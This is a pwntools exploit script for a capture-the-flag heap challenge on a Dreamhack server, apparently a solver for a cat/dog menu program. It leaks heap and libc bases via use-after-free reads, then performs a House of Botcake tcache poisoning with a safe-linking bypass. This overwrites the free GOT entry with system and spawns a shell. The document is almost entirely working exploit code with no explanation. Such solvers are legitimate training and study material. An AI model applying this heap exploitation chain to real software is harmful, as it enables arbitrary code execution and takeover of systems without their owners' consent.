#!/usr/bin/python3
from pwn import * 

exe = ELF('./main_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))
	
def GDB():
	gdb.attach(p, gdbscript='''
		b* 0x00000000004014A3
		b* 0x0000000000401744
		c
		''')

if args.REMOTE:
	HOST = "host8.dreamhack.games"
	PORT = 11797
	p = remote(HOST, PORT)
else:
	p = process(exe.path)

def get_cat(idx):
	sla(b'choice: ', b'1')
	slan(b'cat: ', idx)
def see_cat(idx):
	sla(b'choice: ', b'2')
	slan(b'cat: ', idx)
def pet_cat(idx, word):
	sla(b'choice: ', b'3')
	slan(b'cat: ', idx)
	sa(b'word: ', word)
def release_cat(idx):
	sla(b'choice: ', b'4')
	slan(b'cat: ', idx)
def get_dog(idx):
	sla(b'choice: ', b'5')
	slan(b'dog: ', idx)
def see_dog(idx):
	sla(b'choice: ', b'6')
	slan(b'dog: ', idx)
def pet_dog(idx, word):
	sla(b'choice: ', b'7')
	slan(b'dog: ', idx)
	sa(b'word: ', word)
def release_dog(idx):
	sla(b'choice: ', b'8')
	slan(b'dog: ', idx)

#GDB()
input("Stage 1: Leak Libc")
for x in range(7):
	get_cat(x)
get_cat(7)
get_cat(8)
get_cat(9)
release_cat(0)
see_cat(0)
ru(b'says: ')
heap_base = leak(r(5)) << 12
info("Heap Base: ", heap_base)
for x in range(1, 7, 1):
	release_cat(x)
release_cat(8)
see_cat(8)
ru(b'says: ')
libc.address = leak(r(6), 0x21ace0)
info("Libc Base: ", libc.address)
input("Stage 2: House of Botcake")
target = ((heap_base + 0x7a0) >> 12) ^ (exe.got.free - 0x8)
release_cat(7)
get_dog(0)
pld = b'\x00' * 0x98 + p64(0xa1)
pet_dog(0, pld)
get_cat(0)
release_cat(8)
pld = b'\x00' * 0x98 + p64(0xa1) + p64(target)
pet_dog(0, pld)
get_cat(1)
pet_cat(1, b'/bin/sh\0')
get_cat(2)
pet_cat(2, p64(libc.address + 0x240d30) + p64(libc.sym.system))
release_cat(1)
p.interactive()